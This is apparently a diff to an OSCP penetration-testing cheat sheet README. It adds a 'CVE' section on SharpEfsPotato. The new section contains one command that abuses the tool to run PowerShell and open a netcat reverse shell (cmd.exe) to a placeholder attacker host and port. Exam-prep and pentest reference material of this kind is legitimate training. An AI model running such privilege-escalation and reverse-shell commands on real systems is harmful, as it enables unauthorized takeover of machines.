@@ -94,6 +94,8 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
 		- [Windows Tasks & Services](https://github.com/0xsyr0/OSCP#windows-tasks--services)
 		- [Writeable Directories in Linux](https://github.com/0xsyr0/OSCP#writeable-directories-in-linux)
+        - [CVE](https://github.com/0xsyr0/OSCP#cve)
+                - [SharpEfsPotato](https://github.com/0xsyr0/OSCP#sharpefspotato)
 	- [Payloads](https://github.com/0xsyr0/OSCP#payloads-1)
 		- [Reverse Shells](https://github.com/0xsyr0/OSCP#reverse-shells)
 		- [Web Shells](https://github.com/0xsyr0/OSCP#web-shells)
@@ -1913,6 +1915,16 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP
 ```c
 /dev/shm
 /tmp
+```
+
+### CVE
+
+#### SharpEfsPotato
+
+> https://github.com/bugch3ck/SharpEfsPotato
+
+```c
+PS C:\> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
 ```
 
 ### Payloads
